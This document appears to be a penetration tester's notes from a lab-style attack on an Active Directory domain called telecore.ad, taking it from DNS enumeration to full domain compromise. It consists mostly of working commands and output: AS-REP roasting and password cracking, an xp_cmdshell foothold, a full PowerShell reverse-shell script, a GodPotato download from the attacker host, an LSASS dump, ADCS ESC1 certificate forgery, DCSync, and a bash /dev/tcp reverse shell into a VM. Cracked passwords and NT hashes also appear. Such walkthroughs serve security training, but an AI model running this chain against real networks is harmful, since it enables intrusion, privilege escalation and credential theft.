# Telecore.ad – AD Pentest Notes

---

## 1. Environment Setup

**Command:**

```bash
python3 venv adrts
source adrts/bin/activate
```

---

## 2. Host / DNS Discovery

### 2.1 UDP Scan for DNS Servers

**Command:**

```bash
sudo nmap -sU -p 53 --open 10.5.2.0/24
```

**Output:**

```
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-03 19:27 +0100
Nmap scan report for 10.5.2.2
Host is up (0.12s latency).

PORT   STATE SERVICE
53/udp open  domain

Nmap scan report for 10.5.2.99
Host is up (0.20s latency).

PORT   STATE SERVICE
53/udp open  domain

Nmap done: 256 IP addresses (8 hosts up) scanned in 37.60 seconds
```

> **Note:** 10.5.2.2 and 10.5.2.99 identified as DNS servers.

---

### 2.2 Reverse DNS Sweep

**Command:**

```bash
for i in {1..254}; do
  printf "%-15s %s\n" "10.5.2.$i" "$(dig +short -x 10.5.2.$i)"
done > discovered_ips.txt
```

**Output:**

```
10.5.2.111      ESXi-VD.telecore.ad.
```

**Better alternative command:**

```bash
nmap -sL -R --dns-servers 10.5.2.99 10.5.2.0/24
```

|Option|What it does|
|---|---|
|`-sL`|List scan — only does reverse DNS resolution for every address in the range; no packets sent to hosts.|
|`-R`|Always resolve, even for addresses nmap would normally skip. Combined with `-sL`, forces reverse lookup for all 254 IPs.|
|`--dns-servers 10.5.2.99`|Sends reverse lookups directly to the lab DC instead of the system resolver.|
|`10.5.2.0/24`|Full /24 target range.|

**Output (hosts resolved):**

```
dc01.telecore.ad      (10.5.2.2)
PKI-Srv.telecore.ad   (10.5.2.8)
Ex-Srv.telecore.ad    (10.5.2.16)
SQL-Srv.telecore.ad   (10.5.2.22)
ESXi-VD.telecore.ad   (10.5.2.111)
```

**Command:**

```bash
nslookup telecore.ad 10.5.2.99
```

**Output:**

```
Server:		10.5.2.99
Address:	10.5.2.99#53

Name:	telecore.ad
Address: 10.5.2.2
```

---

## 3. DNS Zone Transfer

**Command:**

```bash
dig @10.5.2.99 telecore.ad AXFR
```

**Output:**

```
; <<>> DiG 9.20.29 <<>> @10.5.2.99 telecore.ad AXFR
; (1 server found)
;; global options: +cmd
telecore.ad.		3600	IN	SOA	dc01.telecore.ad. hostmaster.telecore.ad. 159 900 600 86400 3600
telecore.ad.		3600	IN	NS	dc01.telecore.ad.
telecore.ad.		600	IN	A	10.5.2.2
_msdcs.telecore.ad.	3600	IN	NS	dc01.telecore.ad.
_gc._tcp.Default-First-Site-Name._sites.telecore.ad. 600 IN SRV	0 100 3268 dc01.telecore.ad.
_kerberos._tcp.Default-First-Site-Name._sites.telecore.ad. 600 IN SRV 0 100 88 dc01.telecore.ad.
_ldap._tcp.Default-First-Site-Name._sites.telecore.ad. 600 IN SRV 0 100 389 dc01.telecore.ad.
_gc._tcp.telecore.ad.	600	IN	SRV	0 100 3268 dc01.telecore.ad.
_kerberos._tcp.telecore.ad. 600	IN	SRV	0 100 88 dc01.telecore.ad.
_kpasswd._tcp.telecore.ad. 600	IN	SRV	0 100 464 dc01.telecore.ad.
_ldap._tcp.telecore.ad.	600	IN	SRV	0 100 389 dc01.telecore.ad.
_kerberos._udp.telecore.ad. 600	IN	SRV	0 100 88 dc01.telecore.ad.
_kpasswd._udp.telecore.ad. 600	IN	SRV	0 100 464 dc01.telecore.ad.
dc01.telecore.ad.	3600	IN	A	10.5.2.2
DomainDnsZones.telecore.ad. 600	IN	A	10.5.2.2
_ldap._tcp.Default-First-Site-Name._sites.DomainDnsZones.telecore.ad. 600 IN SRV 0 100 389 dc01.telecore.ad.
_ldap._tcp.DomainDnsZones.telecore.ad. 600 IN SRV 0 100 389 dc01.telecore.ad.
ESXi-VD.telecore.ad.	3600	IN	A	10.5.2.111
Ex-Srv.telecore.ad.	1200	IN	A	10.5.2.16
ForestDnsZones.telecore.ad. 600	IN	A	10.5.2.2
_ldap._tcp.Default-First-Site-Name._sites.ForestDnsZones.telecore.ad. 600 IN SRV 0 100 389 dc01.telecore.ad.
_ldap._tcp.ForestDnsZones.telecore.ad. 600 IN SRV 0 100 389 dc01.telecore.ad.
PKI-Srv.telecore.ad.	1200	IN	A	10.5.2.8
SQL-Srv.telecore.ad.	1200	IN	A	10.5.2.22
telecore.ad.		3600	IN	SOA	dc01.telecore.ad. hostmaster.telecore.ad. 159 900 600 86400 3600
;; Query time: 164 msec
;; SERVER: 10.5.2.99#53(10.5.2.99) (TCP)
;; WHEN: Tue Nov 03 20:18:50 CET 2026
;; XFR size: 25 records (messages 1, bytes 1205)
```

**Hosts identified:**

- `dc01.telecore.ad` — 10.5.2.2
- `PKI-Srv.telecore.ad` — 10.5.2.8
- `Ex-Srv.telecore.ad` — 10.5.2.16
- `SQL-Srv.telecore.ad` — 10.5.2.22
- `ESXi-VD.telecore.ad` — 10.5.2.111

---

## 4. AS-REP Roasting

**Command:**

```bash
python3 ~/adrts/adrts/bin/GetNPUsers.py telecore.ad/ -dc-ip 10.5.2.2 -usersfile names.txt -format hashcat -outputfile asrep_hashes.txt
```

**Output:**

```
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User virt-admin doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User tel_ops1 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$tel_support01@TELECORE.AD:4452c226c17b8a12e83482ae94d83770$05cbc87afa6db18d2006efd5475d34069b537205b7a6e3646a7ed837264c6966487b28361dcd1c0a227bdf382c6ea91f892de92415b956b44a8d8290fd23b0b91edbb9acc2557b4e55c072629068606575a8b029e38f204208d4c3901ebcfc1ebd1d65cc0fed4252f6349a915e3149b9485d1d3c5e17c73e36927f8adb685ca887668b407c746eed31232b27d50185c700113197bdc91e1236858d658cfb8434d431cce768e0024bc7bc9d7af5c19d14aeb47d01f160ee5bd7a1b790c24ac68b1b8c87cc1e2586e2f62e3a8eefb4d4d43fbab447aed5606bfef2ee983ce82c8ce72db1d5e9ccc7328e64
```

**Cracked hash — Command:**

```bash
john --wordlist=~/rockyou/rockyou.txt --format=krb5asrep hash
```

**Output:**

```
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
#T3l3phon3!      ($krb5asrep$23$tel_support01@TELECORE.AD)
1g 0:00:00:06 DONE (2026-11-03 20:55) 0.1555g/s 2228Kp/s 2228Kc/s 2228KC/s #mtorres..#2joshsantos
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

**Credential obtained:** `tel_support01 : #T3l3phon3!`

---

## 5. MSSQL Access (SQL-Srv)

**Command:**

```bash
python3 ~/adrts/adrts/bin/mssqlclient.py tel_support01:'#T3l3phon3!'@10.5.2.22 -debug -windows-auth
```

**Output:**

```
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[+] Impacket Library Installation Path: /home/w0nd3r/adrts/adrts/lib/python3.14/site-packages/impacket
[*] Encryption required, switching to TLS
[+] Computed MIC is 3992af6f49cac5e78d421413a39582e2
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(SQL-Srv\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(SQL-Srv\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2022 RTM (16.0.1000)
[!] Press help for extra shell commands
```

**Command (in mssqlclient shell):**

```sql
ls
```

**Output:**

```
ERROR(SQL-Srv\SQLEXPRESS): Line 1: Could not find stored procedure 'ls'.
```

**Command:**

```sql
enable_xp_cmdshell
```

**Command:**

```sql
xp_cmdshell whoami
```

**Output:**

```
output
---------------------------
nt service\mssql$sqlexpress
NULL
```

### 5.1 Reverse Shell via xp_cmdshell

**Command (base64-encoded PowerShell reverse shell, executed via xp_cmdshell):**

```sql
xp_cmdshell powershell -e <base64_blob>
```

> Note: the original base64 payload decodes to a TCP reverse-shell stager connecting back to `10.8.8.27:2345`.

**Listener command:**

```bash
nc -lvnp 2345
```

**Output (shell received):**

```
Listening on 0.0.0.0 2345
Connection received on 10.5.2.22 50537

PS C:\Windows\system32> whoami
nt service\mssql$sqlexpress
```

**Command:**

```powershell
whoami /priv
```

**Output:**

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalPrivilege       Create global objects                     Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
```

> **Key finding:** `SeImpersonatePrivilege` is enabled → candidate for potato-family privesc.

**Command:**

```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
```

**Output:**

```
OS Name:                   Microsoft Windows Server 2022 Standard
OS Version:                10.0.20348 N/A Build 20348
```

---

## 6. Privilege Escalation — GodPotato (SeImpersonatePrivilege abuse)

**Command:**

```powershell
cd C:\Users\Public
iwr -UseBasicParsing http://10.8.8.27:8080/GodPotato-NET4.exe -OutFile GodPotato-NET4.exe
```

**Command:**

```powershell
.\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

**Output:**

```
[*] CombaseModule: 0x140712275935232
[*] DispatchTable: 0x140712278522184
[*] UseProtseqFunction: 0x140712277816896
[*] UseProtseqFunctionParamCount: 6
[*] HookRPC
[*] Start PipeServer
[*] Trigger RPCSS
[*] CreateNamedPipe \\.\pipe\86613029-f61d-41c4-a15c-938d7cbba50b\pipe\epmapper
[*] DCOM obj GUID: 00000000-0000-0000-c000-000000000046
[*] DCOM obj IPID: 00002402-06bc-ffff-634a-bede95724e94
[*] DCOM obj OXID: 0xa6db55c28cb0ce74
[*] DCOM obj OID: 0x9eec2dc31e1f6271
[*] DCOM obj Flags: 0x281
[*] DCOM obj PublicRefs: 0x0
[*] Marshal Object bytes len: 100
[*] UnMarshal Object
[*] Pipe Connected!
[*] CurrentUser: NT AUTHORITY\NETWORK SERVICE
[*] CurrentsImpersonationLevel: Impersonation
[*] Start Search System Token
[*] PID : 952 Token:0x764  User: NT AUTHORITY\SYSTEM ImpersonationLevel: Impersonation
[*] Find System Token : True
[*] UnmarshalObject: 0x80070776
[*] CurrentUser: NT AUTHORITY\SYSTEM
[*] process start with pid 2620
nt authority\system
```

> **Result:** Privilege escalated to `NT AUTHORITY\SYSTEM` on SQL-Srv.

---

## 7. SYSTEM Reverse Shell (PowerShell stager)

**Reverse shell script (`rev.ps1`):**

```powershell
$client = New-Object System.Net.Sockets.TCPClient('YOUR_VPN_IP',1234)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
    $sendback = (iex ". { $data } 2>&1" | Out-String)
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
    $stream.Write($sendbyte,0,$sendbyte.Length)
    $stream.Flush()
}
$client.Close()
```

**Encoding command:**

```bash
cat rev.ps1 | iconv -t UTF-16LE | base64 -w 0
```

**Output (truncated base64):**

```
JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQAwAC4AOAAuADgALgAyADcAJwAsADEAMgAzADQAKQAKACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQAKAFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9AAoAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAG...
```

**Listener command:**

```bash
rlwrap nc -lvnp 1234
```

**Output:**

```
Listening on 0.0.0.0 1234
Connection received on 10.5.2.22 50558

PS C:\Users\Public> whoami
nt authority\system
PS C:\Users\Public> hostname
SQL-Srv
```

**Command:**

```powershell
whoami /priv
```

**Output:**

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Disabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Disabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Disabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Disabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Disabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Disabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
SeBackupPrivilege                         Back up files and directories                                      Disabled
SeRestorePrivilege                        Restore files and directories                                      Disabled
SeShutdownPrivilege                       Shut down the system                                               Disabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeAuditPrivilege                          Generate security audits                                           Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Disabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeUndockPrivilege                         Remove computer from docking station                               Disabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Disabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

---

## 8. LSASS Dump (SQL-Srv)

**Command:**

```powershell
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 704 C:\users\Public\lsass.dmp full
```

**Command:**

```powershell
dir C:\Users\Public\lsass.dmp
```

**Output:**

```
    Directory: C:\Users\Public


Mode                 LastWriteTime         Length Name                         
----                 -------------         ------ ----                         
-a----         11/3/2026   1:05 PM       48618203 lsass.dmp                    
```

---

## 9. ADCS Enumeration — Certipy

**Command:**

```bash
certipy find \
  -u 'tel_engineer01@telecore.ad' \
  -hashes :e2b1996aaff0f57bccb916265a77970e \
  -dc-ip 10.5.2.2 \
  -enabled \
  -vuln \
  -ldap-scheme ldap \
  -stdout
```

**Output:**

```
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 37 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 16 enabled certificate templates
[*] Finding issuance policies
[*] Found 20 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'telecore-PKI-SRV-CA' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'telecore-PKI-SRV-CA'
[*] Checking web enrollment for CA 'telecore-PKI-SRV-CA' @ 'PKI-Srv.telecore.ad'
[!] Failed to check channel binding: The read operation timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : telecore-PKI-SRV-CA
    DNS Name                            : PKI-Srv.telecore.ad
    Certificate Subject                 : CN=telecore-PKI-SRV-CA, DC=telecore, DC=ad
    Certificate Serial Number           : 35DFAB7883C30297420CBFD2E33CB408
    Certificate Validity Start          : 2025-08-21 07:41:20+00:00
    Certificate Validity End            : 2125-08-21 07:51:20+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : True
        Channel Binding (EPA)           : Unknown
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TELECORE.AD\Administrators
      Access Rights
        ManageCa                        : TELECORE.AD\Administrators
                                          TELECORE.AD\Domain Admins
                                          TELECORE.AD\Enterprise Admins
        ManageCertificates              : TELECORE.AD\Administrators
                                          TELECORE.AD\Domain Admins
                                          TELECORE.AD\Enterprise Admins
        Enroll                          : TELECORE.AD\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.

Certificate Templates
  0
    Template Name                       : Badges
    Display Name                        : Badges
    Certificate Authorities             : telecore-PKI-SRV-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms, PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication, Secure Email, Encrypting File System
    Requires Manager Approval           : False
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Rights                 : Domain Admins, Domain Users, Enterprise Admins
      Full Control Principals           : Domain Admins, Enterprise Admins, tel_admin01
    [+] User Enrollable Principals      : TELECORE.AD\Domain Users
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.

  1
    Template Name                       : Tel_User
    Display Name                        : Tel_User
    Certificate Authorities             : telecore-PKI-SRV-CA
    Enabled                             : True
    Client Authentication               : True
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Enrollment Flag                     : IncludeSymmetricAlgorithms, PublishToDs
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Client Authentication, Secure Email, Encrypting File System
    Requires Manager Approval           : False
    Minimum RSA Key Length              : 2048
    Permissions
      Enrollment Rights                 : tel_engineer01, Domain Admins, Domain Users, Enterprise Admins
      Full Control Principals           : Domain Admins, Enterprise Admins
    [+] User Enrollable Principals      : TELECORE.AD\Domain Users, TELECORE.AD\tel_engineer01
    [!] Vulnerabilities
      ESC1                              : Enrollee supplies subject and template allows client authentication.
```

> **Key finding:** `Tel_User` template is vulnerable to **ESC1** (enrollee-supplied subject + client auth) and `tel_engineer01` has enrollment rights → can request a cert impersonating Administrator.

---

## 10. ADCS Exploitation (ESC1) — Certipy

**Command:**

```bash
certipy req \
  -u 'tel_engineer01@telecore.ad' \
  -hashes :e2b1996aaff0f57bccb916265a77970e \
  -dc-ip 10.5.2.2 \
  -ns 10.5.2.2 \
  -target PKI-Srv.telecore.ad \
  -ca 'telecore-PKI-SRV-CA' \
  -template 'Tel_User' \
  -upn 'administrator@telecore.ad' \
  -sid 'S-1-5-21-1588247407-410625039-1511794522-500'
```

**Output:**

```
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 25
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@telecore.ad'
[*] Certificate object SID is 'S-1-5-21-1588247407-410625039-1511794522-500'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

### 10.1 Authenticating with the forged certificate

**Command:**

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.5.2.2
```

**Output (initial failure):**

```
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@telecore.ad'
[*]     SAN URL SID: 'S-1-5-21-1588247407-410625039-1511794522-500'
[*]     Security Extension SID: 'S-1-5-21-1588247407-410625039-1511794522-500'
[*] Using principal: 'administrator@telecore.ad'
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KDC_ERR_PADATA_TYPE_NOSUPP(KDC has no support for padata type)
[-] Use -debug to print a stacktrace
[-] See the wiki for more information
```

**Command (fallback — LDAP shell auth):**

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.5.2.2 -ldap-shell
```

**Output:**

```
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@telecore.ad'
[*]     SAN URL SID: 'S-1-5-21-1588247407-410625039-1511794522-500'
[*]     Security Extension SID: 'S-1-5-21-1588247407-410625039-1511794522-500'
[*] Connecting to 'ldaps://10.5.2.2:636'
[*] Authenticated to '10.5.2.2' as: 'u:TELECORE\\Administrator'
Type help for list of commands
```

**Available LDAP shell commands (reference):**

```
add_computer computer [password] [nospns]
rename_computer current_name new_name
add_user new_user [parent]
add_user_to_group user group
change_password user [password]
clear_rbcd target
clear_shadow_creds target
disable_account user
enable_account user
dump
search query [attributes,]
get_user_groups user
get_group_users group
get_laps_password computer
grant_control [search_base] target grantee
set_dontreqpreauth user true/false
set_rbcd target grantee
set_shadow_creds target
start_tls
whoami
dirsync
exit
```

> **Result:** Authenticated to LDAP as `TELECORE\Administrator` via the forged certificate.

---

## 11. DCSync — Dumping Domain Hashes

**Command:**

```bash
secretsdump.py telecore.ad/administrator@10.5.2.2 \
  -hashes :e2b1996aaff0f57bccb916265a77970e \
  -just-dc-user administrator -just-dc-ntlm
```

**Output:**

```
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
telecore.ad\Administrator:500:aad3b435b51404eeaad3b435b51404ee:bfb19bca32a6aab8e0b9a836da860e32:::
[*] Cleaning up...
```

**Command:**

```bash
echo 'bfb19bca32a6aab8e0b9a836da860e32' > DC_hash.txt
```

### 11.1 Validating the Administrator Hash

**Command:**

```bash
smbclient -L 10.5.2.2 -U 'administrator%bfb19bca32a6aab8e0b9a836da860e32' --pw-nt-hash
```

**Output:**

```
Can't load /etc/samba/smb.conf - run testparm to debug it

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share
	SYSVOL          Disk      Logon server share
SMB1 disabled -- no workgroup available
```

---

## 12. Domain Admin Shell & Group Enumeration

**Command:**

```bash
wmiexec.py -hashes :bfb19bca32a6aab8e0b9a836da860e32 'administrator@10.5.2.2'
```

**Output:**

```
Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
```

**Command:**

```cmd
net group "Domain Admins" /domain
```

**Output:**

```
Group name     Domain Admins
Comment        Designated administrators of the domain

Members
-------------------------------------------------------------------------------
Administrator            tel_engineer01
The command completed successfully.
```

**Command:**

```cmd
net group "ESX Admins" /domain
```

**Output:**

```
Group name     ESX Admins
Comment

Members
-------------------------------------------------------------------------------
virt-admin
The command completed successfully.
```

---

## 13. Cracking the DC Administrator NT Hash

**Command:**

```bash
john --format=NT --wordlist=~/rockyou/rockyou.txt DC_hash.txt
```

**Output:**

```
Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 128/128 AVX 4x3])
Warning: no OpenMP support for this hash type, consider --fork=12
Press 'q' or Ctrl-C to abort, almost any other key for status
August1990password (?)
1g 0:00:00:00 DONE (2026-11-03 22:53) 1.960g/s 22379Kp/s 22379Kc/s 22379KC/s AugustFriday26..August161988
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```

**Credential obtained:** `Administrator : August1990password`

---

## 14. ESXi Host Enumeration & Pivot

**Command:**

```bash
nmap -sT -sV 10.5.2.111
```

**Output:**

```
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-03 22:50 +0100
Nmap scan report for 10.5.2.111
Host is up (0.095s latency).
Not shown: 992 closed tcp ports (conn-refused)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.5 (protocol 2.0)
80/tcp   open  http            VMware Server http config
443/tcp  open  ssl/http        VMware Server http config
902/tcp  open  ssl/vmware-auth VMware Authentication Daemon 1.10 (Uses VNC, SOAP)
5989/tcp open  ssl/wbem        SBLIM Small Footprint CIM Broker
8000/tcp open  http-alt?
8300/tcp open  tmi?
9080/tcp open  ssl/soap        gSOAP 2.8

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 172.19 seconds
```

### 14.1 VM Enumeration (custom script)

**Command:**

```bash
python3 enum_vms.py
```

**Output:**

```
VM: VaultVM
 Power: poweredOn
 OS: Ubuntu Linux (64-bit)
 Tools: toolsOk
 IP: 10.5.2.50
 Notes: Guest VM Credentials :

linux \ VaultAdmin@123
```

> **Credential found in VM notes:** `linux : VaultAdmin@123`

### 14.2 Guest Command Execution on VaultVM via ESXi API

**Command:**

```bash
python3 cmd_exec.py --host 10.5.2.111 \
  --user administrator@telecore.ad \
  --password 'August1990password' \
  --vm 'VaultVM' \
  --guest-user linux --guest-pass 'VaultAdmin@123' \
  --cmd /bin/bash \
  --args "-c 'bash -i >& /dev/tcp/10.8.8.27/5556 0>&1'"
```

**Output:**

```
Started PID 32149
None
```

**Listener command:**

```bash
rlwrap nc -lvnp 5556
```

**Output (shell received on VaultVM):**

```
Listening on 0.0.0.0 5556
Connection received on 10.5.2.50 52246
bash: cannot set terminal process group (1406): Inappropriate ioctl for device
bash: no job control in this shell
Welcome to Linux Lite 7.4 linux

Friday 11 September 2026, 06:22:30
Memory Usage: 1526/2930MB (52.08%)
Disk Usage: 536/1GB (37%)
Support - https://www.linuxliteos.com/forums/ (Right click, Open Link)
```

**Command:**

```bash
ls
```

**Output:**

```
Desktop
Documents
Downloads
Music
Pictures
Public
Templates
Videos
```

---

## Summary — Credentials & Access Chain

|Stage|Principal|Credential / Hash|Access Gained|
|---|---|---|---|
|AS-REP Roast|tel_support01|`#T3l3phon3!`|MSSQL login|
|xp_cmdshell → GodPotato|mssql$sqlexpress → SYSTEM|n/a|SYSTEM on SQL-Srv|
|ADCS ESC1|tel_engineer01 → Administrator cert|NT hash `e2b1996aaff0f57bccb916265a77970e`|LDAP as Domain Administrator|
|DCSync|Administrator|NT hash `bfb19bca32a6aab8e0b9a836da860e32`|Full domain compromise|
|Hash crack|Administrator|`August1990password`|Interactive admin access|
|ESXi VM notes|linux (VaultVM)|`VaultAdmin@123`|Shell on VaultVM (10.5.2.50)|

## Open / Next Steps

- [ ] Enumerate VaultVM filesystem for further credentials/secrets
- [ ] Check LAPS passwords via `get_laps_password`
- [ ] Review `ESX Admins` group (`virt-admin`) for further ESXi-level privilege
- [ ] Confirm ESC8 (HTTP web enrollment) as an alternate path if cert auth is revoked